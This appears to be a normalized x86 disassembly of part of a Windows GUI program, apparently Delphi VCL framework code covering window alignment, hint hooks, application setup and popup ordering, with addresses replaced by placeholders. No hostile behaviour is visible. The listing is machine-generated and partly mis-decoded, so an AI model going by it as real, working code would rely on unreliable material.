je r-xdata
retn
movzx edx [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_458fe4
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_42360c
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_42360c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456662
cmp [ rw-data ] 0x0
je r-xdata
sub_456698
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
dec cl
je r-xdata
mov eax esi
call sub_4506f8
mov ebx eax
mov eax edi
call sub_4506f8
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4506f8
mov ebx eax
add ebx [ edi + 0x4c ]
mov eax esi
call sub_4506f8
add eax [ esi + 0x4c ]
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
mov eax esi
call sub_4506d8
mov ebx eax
mov eax edi
call sub_4506d8
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
mov eax edi
call sub_4506d8
mov ebx eax
add ebx [ edi + 0x48 ]
mov eax esi
call sub_4506d8
add eax [ esi + 0x48 ]
cmp ebx eax
setl al
jmp r-xdata
sub_456720
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
movzx eax [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
movzx eax [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x273 ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax ebx
call sub_4506d8
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4506f8
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x88 ]
cmp [ ebx + 0x273 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
movzx eax [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
movzx edx [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_456866 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_4568dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_455ff0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
movzx eax [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4167c8
movzx edx [ ebp - 0x1 ]
call sub_456720
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_455fdc
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
movzx eax [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x273 ] 0x1
je r-xdata
cmp [ ebx + 0x273 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_416668
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_416844
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4167c8
mov edx eax
movzx ecx [ ebp - 0x1 ]
mov eax ebx
call sub_456698
test al al
je r-xdata
inc esi
sub_456a2c
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_455ff0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_455fdc
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x273 ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_456a84
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_456a2c
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_456afe
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_4568dc
pop ecx
push ebp
mov al 0x2
call sub_4568dc
pop ecx
push ebp
mov al 0x3
call sub_4568dc
pop ecx
push ebp
mov al 0x4
call sub_4568dc
pop ecx
push ebp
mov al 0x5
call sub_4568dc
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403f64
retn
sub_456b0c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_456668
xor eax eax
push ebp
push sub_456b85
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_456a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_456670
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_456ba0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_404e44
pop esi
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x84 ]
call sub_404e98
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_456bf8
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_456c29
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_459644
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_456c4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_43a67c
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_4596f0
sub_456ca8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4584a0
sub_456cec
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xad ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_456ca8
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_456c4c
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_456d60
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_456dbc
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_456dec
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_456e14
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_456dbc
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_456dec
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_456dec
sub_456e44
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x58 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x58 ]
mov edx esi
call sub_4167c8
call sub_403f64
inc esi
dec ebx
jne r-xdata
sub_456ea0
push ebx
push esi
push edi
push ebp
mov edi eax
xor ebp ebp
mov eax edi
call sub_455fa4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
call sub_456e7c
mov eax edi
call sub_455fa4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_455f90
mov ebp eax
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_455f90
mov ebp eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_455f90
call sub_455d04
test al al
je r-xdata
mov edx ebx
mov eax edi
call sub_455f90
call sub_455d04
test al al
je r-xdata
sub_456f30
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41da5c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_404288
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4589e0
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x98 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0xb0 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0xa5 ] 0x1
mov [ ebx + 0xbc ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_429df8
mov esi eax
mov [ ebx + 0xa0 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_42a1cc
mov eax [ ebx + 0xa0 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4592bc
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40ea90
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_458bec
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40eac4
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_40a344
lea eax [ ebp - 0x101 ]
push eax
call CharNextA
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4050b4
mov [ ebx + 0xd4 ] 0x0
push ebx
push sub_458540
call sub_41ebd8
mov [ ebx + 0xc8 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0xa6 ] 0x1
xor eax eax
mov [ ebx + 0xa8 ] eax
mov eax ebx
call sub_459498
mov eax ebx
call sub_459ff8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_457284
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_457149
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
call sub_45a008
mov [ esp + 0x4 ] esi
mov [ esp ] sub_4589e0
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_458bec
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa8 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0xa5 ] 0x0
mov eax esi
call sub_4596f0
xor edx edx
mov eax esi
call sub_458fe4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41daa8
mov eax [ esi + 0xc8 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
push esi
push sub_457840
mov eax esi
call sub_458770
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
call sub_41ec8c
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xac ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_406af4
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xb0 ]
call sub_403f64
mov eax [ esi + 0x90 ]
call sub_403f64
mov eax [ esi + 0x98 ]
call sub_403f64
mov eax [ esi + 0xa0 ]
call sub_403f64
test bl bl
jle r-xdata
call sub_41ebb4
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_457284
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_457425
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xac ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45742c
lea eax [ ebp - 0x2c ]
call sub_404e44
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_45798c
call sub_41eb1c
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_405324
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_407e10
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_404e44
mov [ ebx + 0xac ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_4580a0
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_4580a0
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_457434
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_455ff8
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_457494
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_416668
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_443be8
cmp ebx eax
je r-xdata
sub_457504
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_457494
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4167c8
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45761c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0xd0 ]
call sub_406250
mov edx eax
test edx edx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc edx
xor eax eax
inc eax
dec edx
jne r-xdata
mov edx [ ebx + 0xd0 ]
xor ecx ecx
mov [ edx + esi * 4 + 0x4 ] ecx
mov eax [ ebx + 0xd0 ]
mov [ eax + esi * 4 ] 0xffffffff
jmp r-xdata
lea esi [ eax + eax * 2 ]
mov ecx [ ebx + 0xd0 ]
cmp edi [ ecx + esi * 4 + 0x4 ]
jne r-xdata
sub_45766c
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4167c8
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4576d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
or esi 0xffffffff
push 0x4
mov eax [ ebp + 0x8 ]
push eax
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ rw-data ]
mov eax [ eax + 0x98 ]
mov edx ebx
call sub_416824
test eax eax
jge r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
call GetWindowThreadProcessId
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x98 ]
mov edx ebx
call sub_416668
call GetCurrentProcessId
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_457748
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
cmp [ edi + 0x9c ] 0x0
jle r-xdata
cmp [ edi + 0x9c ] 0x0
jne r-xdata
dec [ edi + 0x9c ]
cmp [ edi + 0x9c ] 0x0
jne r-xdata
inc [ edi + 0x9c ]
jmp r-xdata
push 0x0
push sub_4576d8
call EnumWindows
mov eax [ edi + 0x98 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
mov eax [ edi + 0x98 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ edi + 0x98 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
cmp bl 0x1
cmc
sbb eax eax
push eax
mov edx esi
mov eax [ edi + 0x98 ]
call sub_4167c8
push eax
call ShowOwnedPopups
dec esi
cmp esi 0xffffffff
jne r-xdata
cmp bl 0x1
cmc
sbb eax eax
push eax
mov edx esi
mov eax [ edi + 0x98 ]
call sub_4167c8
push eax
call ShowOwnedPopups
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_457840
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
